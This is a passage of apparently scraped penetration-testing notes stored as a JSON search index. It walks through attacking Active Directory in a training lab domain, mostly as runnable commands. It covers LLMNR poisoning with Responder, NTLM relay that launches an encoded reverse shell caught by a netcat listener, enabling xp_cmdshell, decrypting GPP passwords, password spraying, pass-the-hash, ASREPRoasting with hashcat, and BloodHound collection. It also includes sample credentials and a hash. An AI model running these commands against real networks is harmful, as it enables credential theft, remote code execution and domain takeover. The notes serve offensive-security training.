Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.</p> <p>BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:</p>"},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#using-a-custom-cypher-query-to-check-for-sql-admin-rights-in-bloodhound","title":"Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound","text":"<pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#enumerating-mssql-instances-with-powerupsql","title":"Enumerating MSSQL Instances with PowerUpSQL","text":"<pre><code>Import-Module .\\PowerUpSQL.ps1\nGet-SQLInstanceDomain\n</code></pre> <pre><code>Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#running-mssqlclientpy-against-the-target","title":"Running mssqlclient.py Against the Target","text":"<pre><code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth\n</code></pre> <p>We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.</p>"},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#choosing-enable_xp_cmdshell","title":"Choosing enable_xp_cmdshell","text":"<pre><code>enable_xp_cmdshell\n</code></pre> <pre><code>xp_cmdshell whoami /priv\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/","title":"ActiveDirectory","text":"<p>There is no \"one way\", we need to go back and furth in the phases, roll back to the first one even with valid credentials, skip one and comeback later to it, etc...</p> <p> The important thing is to make sure if stuck is to check all step done till the point where got stuck. </p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#no-credentials","title":"No Credentials","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#domain-enumeration","title":"Domain Enumeration","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#identifying-hosts","title":"Identifying Hosts","text":"<pre><code>$ sudo -E wireshark\n\n$ sudo tcpdump -i ens224 \n\n$ sudo responder -I ens224 -A \n\n$ fping -asgq 172.16.5.0/23\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#scan-alive-hosts","title":"Scan Alive hosts","text":"<p>Check nmap</p> <p>Focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos to find DC ip.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#making-a-target-user-list","title":"Making a Target User List","text":"<ul> <li>By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller</li> <li>Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list</li> <li>Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users</li> <li>Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist</li> </ul>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#smb-null-session-to-pull-user-list","title":"SMB NULL Session to Pull User List","text":"<p>If you are on an internal machine but don\u2019t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or SYSTEM access on a Windows host, then you can easily query Active Directory for this information.</p> <p>It\u2019s possible to do this using the SYSTEM account because it can impersonate the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). If you don\u2019t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to Active Directory.</p> <p>Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with enum4linux with the -U flag.</p> <pre><code># Using enum4linux\n$ enum4linux -U 172.16.5.5  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"\n\n# Using rpcclient\n$ rpcclient -U \"\" -N 172.16.5.5\nrpcclient $&gt; enumdomusers \n\n# Using CrackMapExec\n$ crackmapexec smb 172.16.5.5 --users\n$ awk '{ print $5 }' users.txt | cut -d'\\' -f2 &gt;&gt; validusers.txt\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#gathering-users-with-ldap-anonymous","title":"Gathering Users with LDAP Anonymous","text":"<pre><code># Using ldapsearch\n$ ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  | grep sAMAccountName: | cut -f2 -d\" \"\n\n\n## Using windapsearch\n\n$ ./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#enumerating-users-with-kerbrute","title":"Enumerating Users with Kerbrute","text":"<pre><code>$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n\ngrep -o '[a-zA-Z0-9._%+-]\\+@[a-zA-Z0-9.-]\\+\\.[a-zA-Z]\\{2,6\\}' kerb.txt\ncut -d \"@\" -f 1 your_file.txt\n</code></pre> <p>If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as linkedin2username to mash up possible usernames from a company's LinkedIn page.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#llmnrnbt-ns-poisoning","title":"LLMNR/NBT-NS Poisoning","text":"<p>Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.</p> <p>The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#responder-httpsgithubcomlgandxresponder","title":"[Responder] (https://github.com/lgandx/Responder)","text":"<pre><code>$ sudo responder -I ens224 \n$ sudo responder -I ens224 -w -d\n</code></pre> <p>/usr/share/responder/logs</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#inveigh","title":"Inveigh","text":"<p>If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool Inveigh works similar to Responder</p> <pre><code>PS &gt; Import-Module .\\Inveigh.ps1\nPS &gt; (Get-Command Invoke-Inveigh).Parameters\n\nPS &gt; Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#c-inveigh-inveighzero","title":"C# Inveigh (InveighZero)","text":"<p>Press ESC to enter/exit help</p> <pre><code>PS &gt; .\\Inveigh.exe\n</code></pre> <p>If a NTLM hash is found, next step will be to crack it offline using hashcat.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#cracking-an-ntlmv2-hash-with-hashcat","title":"Cracking an NTLMv2 Hash With Hashcat","text":"<p>Check BruteForce</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#relay","title":"Relay","text":"<p>If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. Let us see an example using impacket-ntlmrelayx.</p> <p>First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).</p> <pre><code>$ cat /etc/responder/Responder.conf | grep 'SMB ='\n</code></pre> <pre><code>$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146\n\n$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e &lt;revshell&gt; '\n\n$ nc -lvnp 9001\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#low-hanging-fruits","title":"Low Hanging Fruits","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#zerologon","title":"ZeroLogon","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#credentials-in-smb-shares-and-sysvol-scripts","title":"Credentials in SMB Shares and SYSVOL Scripts","text":"<p>The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named reset_local_admin_pass.vbs.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#discovering","title":"Discovering","text":"<pre><code>PS &gt; ls \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#group-policy-preferences-gpp-passwords","title":"Group Policy Preferences (GPP) Passwords","text":"<p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:</p> <ul> <li>Map drives (drives.xml)</li> <li>Create local users</li> <li>Create printer config files (printers.xml)</li> <li>Creating and updating services (services.xml)</li> <li>Creating scheduled tasks (scheduledtasks.xml)</li> <li>Changing local admin passwords.</li> <li>These files can contain an array of configuration data and defined passwords. The cpassword attribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.</li> </ul> <p>This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#locating-retrieving-gpp-passwords-with-crackmapexec","title":"Locating &amp; Retrieving GPP Passwords with CrackMapExec","text":"<pre><code>$ crackmapexec smb -L | grep gpp\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#decrypting-the-password-with-gpp-decrypt","title":"Decrypting the Password with gpp-decrypt","text":"<pre><code>$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE\n</code></pre> <p>GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as Get-GPPPassword.ps1, the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#clear-text-password","title":"Clear Text Password","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#check-for-password-reuse","title":"Check for Password Reuse","text":"<p>{ldap,mssql,smb,ssh,winrm}</p> <pre><code>$ crackmapexec &lt;protocol&gt; hosts.lst -u &lt;username&gt; -p &lt;password&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#enumerating-the-password-policy","title":"Enumerating the Password Policy","text":"<ul> <li>With valid domain credentials, the password policy can also be obtained remotely using tools such as CrackMapExec or rpcclient.</li> </ul>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#linux","title":"Linux","text":"<pre><code>$ crackmapexec smb &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --pass-pol\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#smb-null-sessions","title":"SMB NULL Sessions","text":"<p>SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.</p> <pre><code># Using rpcclient\n$ rpcclient -U \"\" -N &lt;DC&gt;\nrpcclient $&gt; querydominfo # check SMB for more queries\n\n\n# Using enum4linux\n$ enum4linux -P &lt;DC&gt;\n\n\n# Using enum4linux-ng\n$ enum4linux-ng -P &lt;DC&gt; -oA &lt;FILE&gt;\n$ cat &lt;FILE&gt;.json \n\n\n# LDAP Anonymous Bind\n$ ldapsearch -h &lt;DC&gt; -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#windows","title":"Windows","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#enumerating-null-session","title":"Enumerating Null Session","text":"<pre><code>&gt; net use \\\\DC01\\ipc$ \"\" /u:\"\"\n\n# Using net.exe\n&gt; net accounts\n\n# Using PowerView\nPS &gt; import-module .\\PowerView.ps1\n&gt; Get-DomainPolicy\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#password-spraying","title":"Password Spraying","text":"<p>Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying. Now let's cover some of the considerations for Password spraying and how to make our target list from the information we have.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#linux_1","title":"Linux","text":"<p>Now that we have created a wordlist using one of the methods outlined in the previous sections, it\u2019s time to execute our attack. The following sections will let us practice Password Spraying from Linux and Windows hosts. This is a key focus for us as it is one of two main avenues for gaining domain credentials for access, but one that we also must proceed with cautiously.</p> <pre><code># Using a Bash one-liner\n$for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done\n\n# Using Kerbrute \n$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1\n\n\n# Using CrackMapExec \n$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +\n$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p password.txt --no-bruteforce| grep + \n\n## Validating the Credentials with CrackMapExec\n$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123\n\n## Local Administrator Password Reuse\n$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#windows_1","title":"Windows","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#using-domainpasswordsprayps1","title":"Using DomainPasswordSpray.ps1","text":"<pre><code>PS &gt; Import-Module .\\DomainPasswordSpray.ps1\nPS &gt; Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#asreproasting","title":"ASREPRoasting","text":"<p>It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account\u2019s password, and any domain user can request it.</p> <p>With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.</p> <p>ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module. The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.</p> <p>Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to DONT_REQ_PREAUTH.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#enumerating-for-dont_req_preauth-value-using-get-domainuser","title":"Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser","text":"<pre><code>PS &gt; Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl\n</code></pre> <p>With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the /nowrap flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#retrieving-as-rep-in-proper-format-using-rubeus","title":"Retrieving AS-REP in Proper Format using Rubeus","text":"<pre><code>PS &gt; .\\Rubeus.exe asreproast /user:&lt;USERNAME&gt; /nowrap /format:&lt;hashcat|john&gt; /outfile:&lt;output_hashes_file&gt;\n</code></pre> <p>When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#retrieving-the-as-rep-using-kerbrute","title":"Retrieving the AS-REP Using Kerbrute","text":"<pre><code>$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt \n</code></pre> <p>With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as jsmith.txt into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#hunting-for-users-with-kerberoast-pre-auth-not-required","title":"Hunting for Users with Kerberoast Pre-auth Not Required","text":"<pre><code>$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users \n\n# check ASREPRoast for all domain users (credentials required)\n$ python GetNPUsers.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -request -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;\n\n# check ASREPRoast for a list of users (no credentials required)\n$ python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;\n</code></pre> <p>We have now covered a few ways that we can perform an ASREPRoasting attack from both Windows and Linux hosts and witnessed how we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#cracking-the-hash-offline-with-hashcat","title":"Cracking the Hash Offline with Hashcat","text":"<pre><code>$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt \n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#got-domain-account-with-valid-credentials-ticket-hash-or-password","title":"Got Domain Account with valid credentials (Ticket, Hash or Password)","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#credentialed-enumeration","title":"Credentialed Enumeration","text":"<pre><code># Domain User Enumeration\n$ sudo crackmapexec smb &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --users\n$ awk -F 'INLANEFREIGHT.LOCAL\\\\\\\\' '{print $2}' crack.txt | awk '{print $1}' &gt; new_crack.txt\n\n$ crackmapexec smb &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --users &gt;&gt; user.txt\n$ awk '{ print $5 }' users.txt | cut -d'\\' -f2 &gt;&gt; validusers.txt\n\n$ GetADUsers.py -all -dc-ip &lt;dc_ip&gt; &lt;DOMAIN&gt;/&lt;USERNAME&gt; \n\n# Domain Group Enumeration\n$ sudo crackmapexec smb &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --groups\n\n\n# Logged On Users\n\"\"\"\nlocal admin because (Pwn3d!)\n\"\"\"\n$ sudo crackmapexec smb &lt;MACHINE_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;2 --loggedon-users\n\n# SMB shares \nCheck SMB service \n\n# rpcclient\nCheck SMB service \n\n# Windapsearch\n## Domain Admins\n$ python3 windapsearch.py --dc-ip &lt;DC_IP&gt; -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; --da\n\n## Privileged Users\n$ python3 windapsearch.py --dc-ip &lt;DC_IP&gt; -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -PU\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#bloodhoundpy-httpsgithubcomfox-itbloodhoundpy","title":"Bloodhound.py [https://github.com/fox-it/BloodHound.py]","text":"<p>Once we have domain credentials, we can run the BloodHound.py BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or \"attack paths\" of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses graph theory to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the SharpHound collector written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using Cypher language. The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.</p> <pre><code>$ sudo bloodhound-python -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -ns &lt;DC_IP&gt; -d inlanefreight.local -c all \n\n# Upload the Zip File into the BloodHound GUI**\n$ sudo neo4j start (kali:neo4j, neo4j:kali)\n$ zip -r ilfreight_bh.zip *.json\n\n$ bloodhound \n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#activedirectory-powershell-module","title":"ActiveDirectory PowerShell Module","text":"<pre><code>PS &gt; Get-Module\n\n# Load ActiveDirectory Module\nPS &gt; Import-Module ActiveDirectory\n\n# Group Enumeration\nPS &gt; Get-ADGroup -Filter * | select name\n\n# Detailed Group Info\nPS &gt; Get-ADGroup -Identity \"Backup Operators\"\n\n# Group Membership\nPS &gt; Get-ADGroupMember -Identity \"Backup Operators\"\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#powerview-httpsgithubcompowershellmafiapowersploitblobmasterreconpowerviewps1","title":"PowerView [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1]","text":"<pre><code># Domain User Information\nPS &gt; Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\n\n# Recursive Group Membership\nPS &gt;  Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n\n# We can use the Test-AdminAccess function to test for local admin access on either the current machine or a remote one.\n## Testing for Local Admin Access\nPS &gt; Test-AdminAccess -ComputerName ACADEMY-EA-MS01\n\n# Finding Users With SPN Set (kerberostables)\nPS &gt; Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#sharpview-httpsgithubcomdmchellsharpview","title":"SharpView [https://github.com/dmchell/SharpView]","text":"<pre><code>PS &gt; .\\SharpView.exe Get-DomainUser -Identity forend\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#snaffler-httpsgithubcomsnaffconsnaffler","title":"Snaffler [https://github.com/SnaffCon/Snaffler]","text":"<p>Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.</p> <pre><code>PS &gt; .\\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#bloodhound-httpsgithubcombloodhoundadbloodhound","title":"BloodHound [https://github.com/BloodHoundAD/BloodHound]","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#sharphound-httpsgithubcombloodhoundadbloodhoundtreemastercollectors","title":"SharpHound [https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors]","text":"<pre><code>PS &gt; .\\SharpHound.exe -c All --zipfilename ILFREIGHT\nPS &gt; .\\SharpHound.exe -c All --zipfilename ILFREIGHT --ldapusername AB920 --ldappassword weasal\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#living-off-the-land","title":"Living Off the Land","text":"<pre><code># Quick Checks Using PowerShell\nwhoami /groups\n\nPS &gt; Get-Module\nPS &gt; Get-ExecutionPolicy -List\nPS &gt; Get-ChildItem Env: | ft key,value\n\n\n# Downgrade Powershell\nPS &gt; Get-host\nPS &gt; powershell.exe -version 2\nPS &gt; Get-host\nPS &gt; get-module\n\n# Firewall Checks\nPS &gt; netsh advfirewall show allprofiles\n\n\n# Windows Defender Check (from CMD.exe)\n&gt; sc query windefend\n\n# Get-MpComputerStatus\nPS &gt; Get-MpComputerStatus\n\n# Am I Alone?\n'\nWhen landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.\n'\n\n# Using qwinsta\nPS &gt; qwinsta\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#network-information","title":"Network Information","text":"Networking Commands Description arp -a Lists all known hosts stored in the arp table. ipconfig /all Prints out adapter settings for the host. We can figure out the network segment from here. route print Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host. netsh advfirewall show state Displays the status of the host's firewall. We can determine if it is active and filtering traffic. <pre><code># Using arp -a\nPS &gt; arp -a\n\n# Viewing the Routing Table\nPS &gt; route print\n\n'\nUsing arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.\n'\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#windows-management-instrumentation-wmi","title":"Windows Management Instrumentation (WMI)","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#quick-wmi-checks","title":"Quick WMI checks","text":"Command Description wmic qfe get Caption,Description,HotFixID,InstalledOn  Prints the patch level and description of the Hotfixes applied wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List Displays basic host information to include any attributes within the list wmic process list /format:list A listing of all processes on host wmic ntdomain list /format:list    Displays information about the Domain and Domain Controllers wmic useraccount list /format:list Displays information about all local accounts and any domain accounts that have logged into the device wmic group list /format:list   Information about all local groups wmic sysaccount list /format:list  Dumps information about any system accounts that are being used as service accounts."},{"location":"zNew/ActiveDirectory/ActiveDirectory/#net-commands","title":"Net Commands","text":"Command Description net accounts Information about password requirements net accounts /domain Password and lockout policy net group /domain Information about domain groups net group \"Domain Admins\" /domain List users with domain admin privileges net group \"domain computers\" /domain List of PCs connected to the domain net group \"Domain Controllers\" /domain List PC accounts of domains controllers net group  /domain User that belongs to the group net groups /domain List of domain groups net localgroup All available groups net localgroup administrators /domain List users that belong to the administrators group inside the 